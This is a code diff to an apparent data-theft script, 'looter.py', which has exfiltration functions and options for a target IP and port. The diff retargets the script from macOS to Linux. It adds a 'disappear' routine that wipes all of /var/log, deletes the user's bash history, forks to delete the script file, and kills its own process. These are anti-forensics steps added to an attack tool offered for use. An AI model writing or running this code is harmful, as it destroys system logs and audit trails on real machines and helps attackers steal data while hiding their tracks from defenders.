@@ -25,7 +25,7 @@ import subprocess
 # Exits program if platform is not supported
 def os_check():
     plat = platform.system()
-    if(plat == "Darwin"):
+    if(plat == "Linux"):
         return plat
     else:
         print "Platform not supported"
@@ -106,6 +106,30 @@ def exfil(path):
 
     return;
 
+# Clean Up Tracks
+def disappear():
+
+    # Wipe out logs
+    cmd = "rm -rf /var/log/*"
+    execute(cmd)
+
+    # Wipe out command history
+    cmd = "rm ~/.bash_history"
+    execute(cmd)
+
+
+    # Remove itself
+    if args.remove:
+        pid = os.fork()
+        if pid == 0:
+            cmd = "sleep 1; rm looter.py"
+            execute(cmd)
+
+    # Terminate script
+    os.kill(os.getpid(), 9)
+
+    return;
+
 ##############################
 ### Command Line Arguments ###
 ##############################
@@ -116,6 +140,7 @@ argparser.add_argument('-ne','--noexfil', action='store_true', help='disable exf
 argparser.add_argument('-d','--dir', action='store', dest='path', help='specify nest egg path')
 argparser.add_argument('-t','--target', action='store', dest='target', help='specify exfil ip address (IPv4 only)')
 argparser.add_argument('-p','--port', action='store', dest='port', help='specify exfil port number')
+argparser.add_argument('-r','--remove', action='store_true', help='remove script after execution')
 args = argparser.parse_args()
 
 ####################
@@ -135,9 +160,12 @@ plat = os_check()
 if not args.path:
     args.path = nest_egg()
 
-# Argument tree
+# Passes through platform and path of script
 robbery(plat,args.path)
-        
+
+# Destroy all the things
+disappear()
+
 # End Program
 exit(0)
     
